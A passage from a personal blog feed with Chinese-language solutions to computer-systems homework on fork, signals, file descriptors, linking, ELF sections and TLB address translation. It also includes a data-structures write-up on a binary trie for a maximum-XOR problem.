      <url>/2022/12/10/ji-suan-ji-xi-tong-gai-lun-zuo-ye-5/</url>
      
        <content type="html"><![CDATA[<ol><li><p>对于如下代码: 请回答以下问题  </p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstdlib&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstdio&gt;</span></span><span class="token keyword">int</span> counter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        counter<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"counter = %d\n"</span><span class="token punctuation">,</span> counter<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 注意: 这里没有 counter++;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"counter = %d\n"</span><span class="token punctuation">,</span> counter<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1) 程序会输出多少行? (空行不计算在内)</p><p><strong>答:</strong> 会输出 10 行.</p><p>2) 程序第一行和最后一行分别会输出什么?</p><p><strong>答:</strong> 第一行输出 <code>counter = 1</code>; 最后一行输出 <code>counter = 2</code>.</p><p>3) 根据系统对进程的调度情况, 程序一共有多少种可能的输出结果? (如果同一时间有若干进程在同时运行, 他们运行的先后顺序的不同可能导致输出结果不同) </p><p><strong>答:</strong> 程序一共有 5 种可能的输出结果.</p><p>分别对应第一次 <code>fork</code> 的子线程在父线程 <code>4</code> 次 <code>counter = 2</code> 的输出之间.</p></li><li><p>对于如下代码:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h&gt;</span></span><span class="token keyword">int</span> pid<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>sig <span class="token operator">==</span> SIGINT <span class="token operator">&amp;&amp;</span> pid <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Killing Child process\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">kill</span><span class="token punctuation">(</span>pid<span class="token punctuation">,</span> SIGKILL<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Child process receiving Kill\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">signal</span><span class="token punctuation">(</span>SIGINT<span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">signal</span><span class="token punctuation">(</span>SIGKILL<span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pid<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> status<span class="token punctuation">;</span>        <span class="token function">waitpid</span><span class="token punctuation">(</span>pid<span class="token punctuation">,</span> <span class="token operator">&amp;</span>status<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">WEXITSTATUS</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"child's exit status=%d\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Waiting...!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在执行过程中, 如果用户按下 <code>Ctrl+C</code>, 请问程序在一串 <code>Waiting…!</code> 之后会输出什么内容, 为什么? </p><p><strong>答:</strong> 会输出:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Child process receiving KillKilling Child processchild's <span class="token builtin class-name">exit</span> <span class="token assign-left variable">status</span><span class="token operator">=</span><span class="token number">255</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>fork</code> 后在父进程内调用 <code>waitpid</code>, 父进程自身被挂起.</p><p>按下 <code>Ctrl+C</code> 后, 系统内核发送 <code>SIGINT</code> 信号至父进程与子进程, 子进程接收 <code>SIGINT</code> 信号, 其信号处理函数输出 <code>Child process receiving Kill</code>, 子进程退出. </p><p>随后父进程恢复, 接受 <code>SIGINT</code> 信号, 其信号处理函数输出 <code>Killing Child process</code>, 最后通过 <code>WEXITSTATUS</code> 获取子进程退出状态, 输出 <code>child's exit status=255</code>.</p></li><li><p>对于如下代码, 程序将输出什么内容, 为什么? (<code>foo.txt</code> 和 <code>bar.txt</code> 文件存在)</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> fd1<span class="token punctuation">,</span> fd2<span class="token punctuation">;</span>    fd1 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"foo.txt"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    fd2 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"bar.txt"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd2<span class="token punctuation">)</span><span class="token punctuation">;</span>    fd2 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"bar.txt"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fd2=%d\n"</span><span class="token punctuation">,</span> fd2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>答:</strong> 会输出 <code>fd2=4</code>.</p><p>进程创建时, <code>标准输入</code>, <code>标准输出</code>, <code>标准错误</code>已分别占用了描述符 <code>0</code>, <code>1</code>, <code>2</code>; 以只读方式打开文件 <code>foo.txt</code> 和 <code>bar.txt</code>, 可用描述符池分配 <code>fd1 = 3</code>, <code>fd2 = 4</code>; 关闭 <code>bar.txt</code> 后, 描述符 <code>4</code> 恢复到描述符池; 打开 <code>bar.txt</code> 后, 仍有 <code>fd2 = 4</code>.</p></li><li><p>在以下情形中, 分别需要使用什么 IO 方式来进行处理:</p><p>1) 编译器读取源文件  <strong>Standard IO.</strong></p><p>2) 编译器生成可执行文件  <strong>Standard IO.</strong></p><p>3) 处理图像文件  <strong>Standard  IO.</strong></p><p>4) 程序需要读写超大规模的文件，运行过程中可能需要处理外部信号  <strong>Unix IO.</strong></p><p>5) 访问网络内容  <strong>RIO.</strong></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统概论 作业4</title>
      <link href="/2022/12/08/ji-suan-ji-xi-tong-gai-lun-zuo-ye-4/"/>
      <url>/2022/12/08/ji-suan-ji-xi-tong-gai-lun-zuo-ye-4/</url>
      
        <content type="html"><![CDATA[<ol><li><p>某代码由 <code>foo.c</code> 与 <code>bar.c</code> 构成. 内容如下: </p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* foo.c */</span> <span class="token keyword">void</span> <span class="token function">p2</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token function">p2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* bar.c */</span> <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span> </span><span class="token keyword">extern</span> <span class="token keyword">char</span> main<span class="token punctuation">;</span> <span class="token keyword">void</span> <span class="token function">p2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x%x\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>main<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>( 具体取决于编译器实现 )</p><p>1) 请问能否正常联合编译? 如果可以联合编译则运行结果如何? 请说明你给出的回答的理由.</p><p><strong>答:</strong> 可以正常联合编译. 运行结果为编译后 <code>main()</code> 函数的地址. 因为 <code>main</code> 函数在 <code>bar.c</code> 中声明, 联合编译后 <code>p2()</code> 函数会输出变量 <code>main</code> 存储的值, 即编译后 <code>main()</code> 函数的地址.</p><p>2) 如果去掉 <code>bar.c</code> 中的 <code>extern</code> 关键字, 能否正常联合编译? 如果可以联合编译则运行结果如何? 请说明你给出的回答的理由. </p><p><strong>答:</strong> 可以正常联合编译. 运行结果为编译后 <code>main()</code> 函数的地址. (因为 <code>main</code> 为强定义, 会覆盖未初始化的弱定义 <code>char main</code>, 链接时不在乎类型.) 删去之后联合编译, 会在 <code>foo.c</code> 中得到其定义, 联合编译后 <code>p2()</code> 函数会输出 <code>main()</code> 函数的地址.</p></li><li><p>对于如下代码 <code>foo.c</code>, 如果编译为 <code>foo.o</code>, 那么在 <code>elf</code> 文件的以下段中, 会出现哪些符号? (如果有多种合法分布情况, 则任意给出一种即可).</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token number">3</span>   <span class="token keyword">extern</span> <span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token number">4</span><span class="token number">5</span>   <span class="token keyword">inline</span> <span class="token keyword">int</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>v1<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>v2<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>v3<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token number">6</span>       <span class="token operator">*</span>v3 <span class="token operator">=</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token operator">*</span>v1<span class="token punctuation">,</span> <span class="token operator">*</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token number">7</span>   <span class="token punctuation">}</span> <span class="token number">8</span> <span class="token number">9</span>   <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token number">10</span>  <span class="token keyword">extern</span> <span class="token keyword">int</span> b<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token number">11</span>  <span class="token keyword">static</span> <span class="token keyword">int</span> c<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token number">12</span> <span class="token number">13</span>  <span class="token keyword">int</span> <span class="token function">total_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token number">14</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token number">15</span>          <span class="token function">process</span><span class="token punctuation">(</span>a<span class="token operator">+</span>i<span class="token punctuation">,</span> b<span class="token operator">+</span>i<span class="token punctuation">,</span> c<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token number">16</span>      <span class="token punctuation">}</span> <span class="token number">17</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>( <code>gcc</code> 的内联函数需为 <code>static inline</code>. )</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.bss: a, b, c..data: 无. .text: total_process..symtab: add, process, a, b, c.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其中对于 <code>total_process</code> 函数中用到的符号, 哪些会在编译期被定位, 哪些会在链接期被定位?</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">编译期定位的符号: i, total_process.链接期定位的符号: a, b, c.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>下面的问题涉及虚拟地址转换为物理地址</p><ul><li>内存是字节可寻址的  </li><li>内存访问是针对 <strong><code>1</code> 字节的字</strong>(即本题的 <code>word</code> 就是 <code>1</code> 个 <code>byte</code>)</li><li>虚拟地址 <code>16</code> 位宽 / 物理地址 <code>14</code> 位  </li><li>页面大小为 <code>1024</code> 字节  </li><li><code>TLB</code> 是 <code>4</code> 路组相联 (<code>4-way set associative</code>), 共有 <code>16</code> 个表项  </li></ul><p>在下表中, 所有数字都是十六进制的. 前 <code>32</code> 页的 <code>TLB</code> 和页表内容如下：</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202406302055103.png" alt=""></p><p>1) 下面的框显示了虚拟地址的格式. 指出字段用于确定以下内容: VPO / VPN / TLBI / TLBT</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">VPN: <span class="token number">15</span> - <span class="token number">10</span>VPO: <span class="token number">9</span> - <span class="token number">0</span>TLBI: <span class="token number">11</span> - <span class="token number">10</span>TLBT: <span class="token number">15</span> - <span class="token number">12</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>类似的标注出物理地址的格式: PPO / PPN </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PPN: <span class="token number">13</span> - <span class="token number">10</span>PPO: <span class="token number">9</span> - <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2) 对于给定的两个虚拟地址 (<code>0x2F09</code>、<code>0x0C53</code>), 请分别表示出相应的 <code>TLB</code> 表项和物理地址, 并指出 <code>TLB</code> 是否命中、是否发生 <code>page fault</code>. 如 <code>page fault</code>, 请在 <code>PPN</code> 中输入 <code>-</code>, <code>C</code> 部分留白.</p><p><strong>答:</strong></p><p><strong>0x2F09:</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">A:    Virtual Address:    0010 <span class="token number">1111</span> 0000 <span class="token number">1001</span>B:    VPN: 0x0B    TLB Index: 0x3    TLB Tag:0x2    TLB Hit: No <span class="token punctuation">(</span>注意这个 Hit<span class="token operator">!</span><span class="token punctuation">)</span>    Page Fault: Yes    PPN: -C:    Physical Address:    留白.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>0x0C53:</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">A:    Virtual Address:    0000 <span class="token number">1100</span> 0101 0011B:    VPN: 0x03    TLB Index: 0x3    TLB Tag:0x0    TLB Hit: Yes    Page Fault: No    PPN: 0xDC:    Physical Address:    <span class="token number">11</span> 0100 0101 0011<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>程序运行之前需要为程序分配对应的内存空间, 并为内存空间赋予一定的初始值和属性, 下表为 <code>x86</code> 架构下用户空间的内存映射关系. 请填写下表, 并说明可执行文件对应的段 (<code>.data</code>, <code>.bss</code>, <code>.init</code>, <code>.rodata</code>, <code>.text</code>) 段分别会被以什么属性映射到哪部分内存空间中.</p><p>|     内存起始地址     |       内存类型       |                内存初始值                 |   内存属性   |<br>| :—————————: | :—————————: | :———————————————————-: | :—————: |<br>|      0xFFFFFFFF      |       内核地址       |                 系统决定                  | 不可读不可写 |<br>|      0xC0000000      |          栈          |                <strong>0(默认)</strong>                | <strong>可读可写</strong> |<br>| <strong>由可执行文件决定</strong> | <strong>共享库内存映射区</strong> |      <strong>共享库文件与可执行文件决定</strong>       |   <strong>只读</strong>   |<br>|      0x40000000      |     运行时堆空间     |             <strong>操作系统决定</strong>              | <strong>可读可写</strong> |<br>|   由可执行文件决定   |   <strong>可读写数据段</strong>   | .<strong>data由可执行文件决定, <br>.bss为 0</strong> |   可读可写   |<br>| <strong>由可执行文件决定</strong> |     <strong>只读数据</strong>     |            <strong>可执行文件决定</strong>             |   <strong>只读</strong>   |<br>|      0x08048000      |     保留内存地址     |                                           |              |</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.data:  可读可写  映射到可读写数据段..bss:  可读可写  映射到可读写数据段..text:  只读  映射到只读数据.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Circuit</title>
      <link href="/2022/12/05/shu-ju-jie-gou-circuit/"/>
      <url>/2022/12/05/shu-ju-jie-gou-circuit/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA4"><a href="#CST-PA4" class="headerlink" title="CST PA4"></a>CST PA4</h1><h2 id="4-1-Circuit"><a href="#4-1-Circuit" class="headerlink" title="4-1 Circuit"></a>4-1 Circuit</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><p>本题需使用 <code>Trie Tree</code> 数据结构, 关于 <code>Trie Tree</code> 的介绍可参考<a href="https://zh.wikipedia.org/zh-hans/Trie">此篇文章</a>. 因为涉及的字符仅为 <code>0</code>, <code>1</code>, 因此实质上相当于一棵 <code>Binary Tree</code>.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 7</span>ull str<span class="token punctuation">[</span><span class="token number">500500</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> ans<span class="token punctuation">[</span><span class="token number">500500</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用 <code>unsigned long long str[]</code> 数组储存 <code>01</code> 串, 不断更改当前的查询串编号, 将超出区间的串从 <code>Trie Tree</code> 中删去, 进入区间的串添加到 <code>Trie Tree</code> 中, 得到的结果存储在 <code>int ans[]</code> 中.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 14</span><span class="token keyword">class</span> <span class="token class-name">node</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> son<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span> trie<span class="token punctuation">[</span><span class="token number">32001000</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因此 <code>Trie Tree</code> 中的串至多为 <code>500000</code> 个, <code>Trie Tree</code> 中的节点至多为 <code>500000 * 64 = 32000000</code> 个. 在节点内部维护其左右子节点 <code>son[0]</code>, <code>son[1]</code>, 并记录经过该节点的 <code>01</code> 串数 <code>cnt</code>.</p><h4 id="void-ReadAll"><a href="#void-ReadAll" class="headerlink" title="void ReadAll()"></a>void ReadAll()</h4><p>使用 <code>getchar()</code> 逐字符读入所给串, 计算其二进制值并存储为 <code>unsigned long long</code>.</p><h4 id="void-Insert"><a href="#void-Insert" class="headerlink" title="void Insert()"></a>void Insert()</h4><p>定义全局变量 <code>pointer</code> 记录下一个将被利用的节点编号.</p><p>对于一个 <code>unsigned long long</code> 存储的 <code>01</code> 串, 从根节点 <code>trie[0]</code> 开始从高到低逐位读取其各位数值, 为 <code>0</code> 则转向当前节点左孩子, 为 <code>1</code> 则转向当前节点右孩子. 若子节点存在, 则相应 <code>cnt++</code>; 若子节点为空, 则用 <code>trie[pointer]</code> 对其初始化, 并 <code>cnt++</code>.</p><p>当读入 <code>01</code> 串最后一位, 到达叶节点时, 直接将对应 <code>01</code> 串的编号存储在叶节点的 <code>cnt</code> 中.</p><h4 id="void-Remove"><a href="#void-Remove" class="headerlink" title="void Remove()"></a>void Remove()</h4><p>对于一个 <code>unsigned long long</code> 存储的 <code>01</code> 串, 按照同样过程在 <code>Trie Tree</code> 中访问其各个节点, 对应 <code>cnt--</code>. 若 <code>cnt</code> 减少到 <code>0</code>, 直接将其父节点的子节点标记置为 <code>0</code>, 以该节点为根的子树在之后都不会被访问.</p><h4 id="int-Query"><a href="#int-Query" class="headerlink" title="int Query()"></a>int Query()</h4><p>为了获得最大异或和, 在树上的每一步向下移动都尝试向着与所给串相反的方向进行即可.</p><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><ul><li>按照编号从下往上扫描序列, 向 <code>Trie Tree</code> 中插入字符串, 靠前字符串编号会覆盖靠后字符串编号, 查询时即可输出最靠前序列编号.</li><li>特别地, 若所有 <code>01</code> 串均相同, 那么 <code>Trie Tree</code> 退化为一条单链. 此时唯一叶节点会在最后被串 <code>0</code> 标记覆盖, <code>Query(0)</code> 返回 <code>0</code>, 只需将其单独改为 <code>1</code> 即可.</li></ul><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p>对每个 <code>01</code> 串进行 <code>Insert</code>, <code>Remove</code>, <code>Query</code> 的时间复杂度均为 $O(1)$, 而每个串至多进行 <code>Insert</code>, <code>Remove</code>, <code>Query</code> 各一次.</p><p>综上, 算法总体时间复杂度为 $O(64n)$.</p><h4 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h4><p>插入的串至多产生64n个节点，而每个节点只维护了左节点、右节点、经过次数（叶节点单位值）这三个信息，因此空间复杂度为O(64n)，常数上限为3倍。</p><p>其他数组均为500050大小，相对花销较小。</p><p>本体空间复杂度取决于 <code>01</code>串数 <code>n</code>, 最多在 <code>Trie Tree</code> 中产生 $64n$ 个节点. 题解中使用 <code>trie[]</code>, <code>str[]</code> 与 <code>ans[]</code> 数组模拟了一棵 <code>Trie Tree</code>, 最坏情况下整体需要的空间为 $O(64n)$.</p><p>本题中直接开辟了相关大小的数组存储信息,</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 7</span>ull str<span class="token punctuation">[</span><span class="token number">500500</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> ans<span class="token punctuation">[</span><span class="token number">500500</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 14</span><span class="token keyword">class</span> <span class="token class-name">node</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> son<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span> trie<span class="token punctuation">[</span><span class="token number">32001000</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>空间消耗最坏情况约为: $5\times 10^5 \times 8B + 5\times 10^5 \times 4B + 3.2\times 10^7 \times 12B = 372MB &lt; 512MB$, 符合题目要求范围.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Data Structure &amp; Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统概论 Lab 2</title>
      <link href="/2022/11/25/ji-suan-ji-xi-tong-gai-lun-lab-2/"/>
      <url>/2022/11/25/ji-suan-ji-xi-tong-gai-lun-lab-2/</url>
      
